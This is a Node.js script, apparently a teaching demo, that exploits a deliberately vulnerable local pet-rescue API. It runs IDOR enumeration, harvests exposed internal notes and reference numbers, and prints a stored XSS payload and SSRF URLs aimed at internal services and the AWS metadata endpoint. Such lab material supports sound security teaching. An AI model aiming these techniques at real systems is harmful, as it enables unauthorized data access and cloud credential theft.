#!/usr/bin/env node

/**
 * Demo script showing how to exploit the implemented vulnerabilities
 * 
 * WARNING: This is for educational purposes only!
 * Never use these techniques against real systems without permission.
 */

const axios = require('axios');

const BASE_URL = 'http://localhost:3000/api/v1';

console.log('🔓 API Security Vulnerability Demo');
console.log('================================\n');

// Demo 1: IDOR Vulnerability
async function demoIDOR() {
  console.log('1. IDOR (Insecure Direct Object Reference) Demo');
  console.log('   Trying to access pets without authentication...\n');
  
  try {
    // Try to access pets with different IDs
    for (let i = 1; i <= 5; i++) {
      try {
        const response = await axios.get(`${BASE_URL}/pets/${i}`);
        console.log(`✅ Successfully accessed pet ${i}:`, response.data.data.name);
        
        // Check if internal notes are exposed
        if (response.data.data.internalNotes) {
          console.log(`   🔍 Internal notes exposed: "${response.data.data.internalNotes}"`);
        }
      } catch (error) {
        if (error.response?.status === 404) {
          console.log(`❌ Pet ${i} not found`);
        } else {
          console.log(`❌ Error accessing pet ${i}:`, error.response?.status);
        }
      }
    }
  } catch (error) {
    console.log('❌ IDOR demo failed:', error.message);
  }
  console.log('');
}

// Demo 2: Information Disclosure
async function demoInformationDisclosure() {
  console.log('2. Information Disclosure Demo');
  console.log('   Checking for exposed sensitive information...\n');
  
  try {
    const response = await axios.get(`${BASE_URL}/pets`);
    
    if (response.status === 200) {
      const pets = response.data.data;
      console.log(`📊 Found ${pets.length} pets`);
      
      // Check for internal notes
      const petsWithNotes = pets.filter(pet => pet.internalNotes);
      if (petsWithNotes.length > 0) {
        console.log(`🔍 Found ${petsWithNotes.length} pets with exposed internal notes:`);
        petsWithNotes.forEach(pet => {
          console.log(`   - Pet ${pet.id}: "${pet.internalNotes}"`);
        });
      }
      
      // Check for reference numbers
      const petsWithRefs = pets.filter(pet => pet.referenceNumber);
      if (petsWithRefs.length > 0) {
        console.log(`🔍 Found ${petsWithRefs.length} pets with exposed reference numbers:`);
        petsWithRefs.forEach(pet => {
          console.log(`   - Pet ${pet.id}: ${pet.referenceNumber}`);
        });
      }
    }
  } catch (error) {
    console.log('❌ Information disclosure demo failed:', error.message);
  }
  console.log('');
}

// Demo 3: XSS Payload Creation
async function demoXSS() {
  console.log('3. Stored XSS Demo');
  console.log('   Creating a pet with XSS payload...\n');
  
  const xssPayload = {
    name: "XSS Test Pet",
    species: "capybara",
    age: 2,
    size: "large",
    description: "<script>alert('XSS Attack!')</script><p>This pet is very friendly!</p>",
    imageUrl: "https://example.com/image.jpg",
    rescueId: "demo-rescue-id"
  };
  
  try {
    console.log('📝 XSS Payload to be stored:');
    console.log(`   Description: "${xssPayload.description}"`);
    console.log('');
    console.log('⚠️  This payload would be stored in the database and executed when rendered!');
  } catch (error) {
    console.log('❌ XSS demo failed:', error.message);
  }
  console.log('');
}

// Demo 4: SSRF Payload Creation
async function demoSsrf() {
  console.log('4. SSRF (Server-Side Request Forgery) Demo');
  console.log('   Creating payloads to test SSRF...\n');
  
  const ssrfPayloads = [
    "http://localhost:8080/internal-service",
    "http://127.0.0.1:8080/admin",
    "http://localhost:3000/api/v1/admin/users",
    "http://169.254.169.254/latest/meta-data/", // AWS metadata
    "http://localhost:8080/internal-image.jpg"
  ];
  
  console.log('🎯 SSRF Payloads that could be used:');
  ssrfPayloads.forEach((url, index) => {
    console.log(`   ${index + 1}. ${url}`);
  });
  
  console.log('');
  console.log('⚠️  These URLs would be fetched by the server when the pet is accessed!');
  console.log('');
}

// Demo 5: Predictable Reference Numbers
async function demoPredictableRefs() {
  console.log('5. Predictable Reference Numbers Demo');
  console.log('   Analyzing reference number patterns...\n');
  
  try {
    const response = await axios.get(`${BASE_URL}/pets`);
    
    if (response.status === 200) {
      const pets = response.data.data;
      const refNumbers = pets.map(pet => pet.referenceNumber).filter(Boolean);
      
      if (refNumbers.length > 0) {
        console.log('🔍 Found reference numbers:');
        refNumbers.forEach(ref => {
          console.log(`   - ${ref}`);
        });
        
        // Analyze pattern
        const pattern = refNumbers[0]?.match(/CAPY-(\d{4})-(\d{3})/);
        if (pattern) {
          console.log('');
          console.log('📊 Pattern Analysis:');
          console.log(`   Format: CAPY-YYYY-NNN`);
          console.log(`   Year: ${pattern[1]}`);
          console.log(`   Sequence: ${pattern[2]}`);
          console.log('');
          console.log('🎯 Predictable patterns make enumeration attacks possible!');
        }
      }
    }
  } catch (error) {
    console.log('❌ Predictable refs demo failed:', error.message);
  }
  console.log('');
}

// Run all demos
async function runAllDemos() {
  await demoIDOR();
  await demoInformationDisclosure();
  await demoXSS();
  await demoSsrf();
  await demoPredictableRefs();
  
  console.log('🎓 Educational Demo Complete!');
  console.log('');
  console.log('📚 Key Takeaways:');
  console.log('   - Always implement proper authorization checks');
  console.log('   - Never expose sensitive information to unauthorized users');
  console.log('   - Always sanitize user input');
  console.log('   - Validate and whitelist external URLs');
  console.log('   - Use cryptographically secure random IDs');
  console.log('');
  console.log('⚠️  Remember: These vulnerabilities are for educational purposes only!');
}

// Run the demo
if (require.main === module) {
  runAllDemos()
    .then(() => {
      console.log('✅ Demo completed successfully!');
      process.exit(0);
    })
    .catch((error) => {
      console.error('❌ Demo failed:', error);
      process.exit(1);
    });
}

module.exports = {
  demoIDOR,
  demoInformationDisclosure,
  demoXSS,
  demoSsrf,
  demoPredictableRefs,
  runAllDemos
}; 